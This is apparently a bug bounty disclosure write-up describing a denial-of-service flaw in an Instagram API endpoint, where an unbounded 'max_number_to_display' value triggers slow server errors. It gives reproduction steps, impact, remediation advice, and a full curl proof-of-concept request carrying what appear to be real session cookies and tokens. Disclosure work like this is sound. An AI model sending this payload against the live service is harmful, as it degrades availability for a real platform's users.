---
layout: single
title: Instagram - DoS via Unbounded max_number_to_display Parameter AYML API
excerpt: "Denial of Service vulnerability in Instagram causing a specific message thread to become unusable. Out of scope for Meta’s bug bounty program due to available self-mitigation (e.g., deleting the thread)."
date: 2025-07-30
classes: wide
header:
  teaser: /img2/images/hackerone.png
  teaser_home_page: true
  icon: /img2/images/hackeronelogo.jpg
categories:
  - Bug Bounty
  - Web
tags:
  - Burpsuite
  - DoS
  - API
---


## Summary

A POST request to the endpoint '/api/v1/discover/ayml/' on Instagram accepts a 'max_number_to_display' parameter with no apparent upper bound. By setting this parameter to an extremely large value (e.g., 9999999999), the server takes approximately 20 seconds to respond and returns a 560/566 Internal Server Error.

This behavior can be reliably reproduced and may lead to a resource exhaustion or logical Denial of Service (DoS) condition. An attacker could abuse this with minimal effort to degrade performance or stability of backend components.

## Steps to Reproduce

- Endpoint:

```
POST https://www.instagram.com/api/v1/discover/ayml/
```

- Headers (required):

```
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
```

- Request Body:

```
max_id=%5B%5D&max_number_to_display=9999999999&module=discover_people&paginate=true
```

## Observed Behavior

- The server takes ~20 seconds to respond.

- The response is a 560/566 Internal Server Error.

- The behavior is consistent and reproducible.

- Reducing the number to a reasonable value (e.g., 100) avoids the issue completely.

## Impact

- This vulnerability may allow an attacker to:

	- Generate sustained backend load with low effort.

	- Cause multiple concurrent slow requests that degrade service availability.

	- Perform a logical DoS without triggering WAFs or rate limits (assuming authenticated sessions).

- This also indicates a lack of proper input validation and resource control.

## Suggested Remediation

- Apply strict server-side validation for max_number_to_display to enforce reasonable upper bounds (e.g., max 500).

- Reject or clamp unusually high values to prevent backend overload.

- Log abuse patterns for this parameter to identify potential abuse at scale.

## Proof of Concept Script (bash)

- Proof of Concept

```bash
curl --path-as-is -i -s -k -X POST \
  -H 'Host: www.instagram.com' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate, br' \
  -H 'X-Csrftoken: o4KGwJpvN0RZ16gkpviIf86b7gHakMXU' \
  -H 'X-Instagram-Ajax: 1025186983' \
  -H 'X-Ig-App-Id: 936619743392459' \
  -H 'X-Asbd-Id: 359341' \
  -H 'X-Ig-Www-Claim: hmac.AR1AQb6TXgWPd4C48BvCGyASfCm4XqPjjOBfDXuU4qJD68p6' \
  -H 'X-Web-Session-Id: 1pl63y:afuedo:xll9x6' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Origin: https://www.instagram.com' \
  -H 'Referer: https://www.instagram.com/explore/people/' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Te: trailers' \
  -b 'datr=ZmaCaHRv5mShWpLhF76V6FEY; ig_did=16BBD5A7-D00B-450E-89EA-6976AAEAA051; mid=aIJmZgAEAAHV31vsZ0qp1dURspV1; wd=1886x877; csrftoken=o4KGwJpvN0RZ16gkpviIf86b7gHakMXU; sessionid=74249493484%3A2m2JqdQLvaW7ur%3A23%3AAYdFI3BENmvs-DhTggtIVqaMG9eMpWfriBiFPCuNrQ; ds_user_id=74249493484; rur="CLN\05474249493484\0541785089902:01fe120fbf1aa61b7a70f4c73f65ec48549c7b7b91f966037a7303075102815021a6fded"' \
  --data-binary 'max_id=%5B%5D&max_number_to_display=9999999999&module=discover_people&paginate=true&jazoest=22745' \
  'https://www.instagram.com/api/v1/discover/ayml/' \
  -w '\nTotal time: %{time_total} seconds\n'
```

- Output 

![](/img2/Pasted%20image%2020250726235839.png)

## Proof of Concept BurpSuite

![](/img2/Pasted%20image%2020250729185334.png)

![](/img2/Pasted%20image%2020250729185456.png)